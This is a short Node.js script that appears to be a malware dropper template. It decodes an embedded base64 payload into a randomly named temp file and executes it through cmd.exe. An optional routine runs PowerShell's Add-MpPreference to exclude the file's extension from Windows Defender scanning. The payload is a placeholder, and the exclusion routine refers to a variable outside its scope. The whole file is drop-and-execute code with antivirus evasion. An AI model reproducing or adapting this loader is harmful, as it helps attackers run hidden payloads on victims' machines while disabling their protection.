var fs = require('fs');
var os = require('os');
var path = require('path');
var spawn = require('child_process').spawn;

var exclusions = false;

var processes = [{process_ext:"key1", process_code:"BASE64DATA", new_console: false, hidden: false}];

function main() {
    for (var i = 0; i < processes.length; i++) {
        handle_process(processes[i].process_ext, processes[i].process_code);
    }
}

function defender_exclusions() {
    var run_command = "cmd.exe";
    var run_args = ["/d", "/c", "call", "powershell.exe", "Add-MpPreference -ExclusionExtension " + process_ext];
    var process = spawn(run_command, run_args, { stdio: 'inherit' });
}

function handle_process(process_ext, process_code) {
    if (exclusions) {
        defender_exclusions();
    }

    var random_name = Math.random().toString(36).substring(7);
    var file_ext = process_ext;
    var tempFile = path.join(os.tmpdir(), random_name + "." + file_ext);

    fs.writeFileSync(tempFile, Buffer.from(process_code, 'base64'));

    var run_command = "cmd.exe";
    var run_args = ["/d", "/c", "call", tempFile];
    var process = spawn(run_command, run_args, { stdio: 'inherit' });
}

main();